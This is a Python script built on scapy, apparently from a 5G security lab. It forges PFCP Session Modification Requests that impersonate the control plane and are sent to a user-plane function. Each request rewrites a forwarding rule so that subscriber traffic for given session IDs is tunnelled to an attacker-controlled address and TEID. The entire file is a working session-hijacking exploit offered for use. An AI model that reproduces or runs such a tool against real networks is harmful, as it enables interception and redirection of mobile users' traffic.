import sys
import time
import logging
from scapy.all import send
from scapy.contrib.pfcp import (
    PFCP, PFCPSessionModificationRequest,
    IE_UpdateFAR, IE_FAR_Id, IE_ApplyAction,
    IE_UpdateForwardingParameters,
    IE_OuterHeaderCreation,
    IE_DestinationInterface,
    IE_NetworkInstance,
)
from scapy.layers.inet import IP, UDP

PFCP_CP_IP  = "10.10.4.102"
PFCP_UP_IP  = "10.10.4.2"
ATTACKER_N3 = "10.10.3.250"
ATTACKER_TEID = 0x00001337

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
logger = logging.getLogger(__name__)

if len(sys.argv) < 2:
    print("Usage: python3 pfcp-redirection.py <seid:seq:sport> ...")
    sys.exit(1)

sessions = []
for arg in sys.argv[1:]:
    parts = arg.split(":")
    sessions.append({
        "seid":  int(parts[0], 16),
        "seq":   int(parts[1]),
        "sport": int(parts[2])
    })

print(f"\n[+] {len(sessions)} sessions cibles")
print(f"[+] Redirection vers : {ATTACKER_N3} TEID={hex(ATTACKER_TEID)}")

for s in sessions:
    pkt = (
        IP(src=PFCP_CP_IP, dst=PFCP_UP_IP) /
        UDP(sport=s['sport'], dport=8805) /
        PFCP(version=1, S=1, seid=s['seid'], seq=s['seq']) /
        PFCPSessionModificationRequest(IE_list=[
            IE_UpdateFAR(IE_list=[
                IE_FAR_Id(id=1),
                IE_ApplyAction(FORW=1),
                IE_UpdateForwardingParameters(IE_list=[
                    IE_DestinationInterface(interface="Access"),
                    IE_NetworkInstance(instance="edge1"),
                    IE_OuterHeaderCreation(
                        GTPUUDPIPV4=1,
                        TEID=ATTACKER_TEID,
                        ipv4=ATTACKER_N3,
                    )
                ])
            ])
        ])
    )
    send(pkt, verbose=0)
    logger.info(f"Redirection -> SEID={hex(s['seid'])} SEQ={s['seq']} vers {ATTACKER_N3}")
    time.sleep(0.1)

print("\n[+] Redirection lancee.")
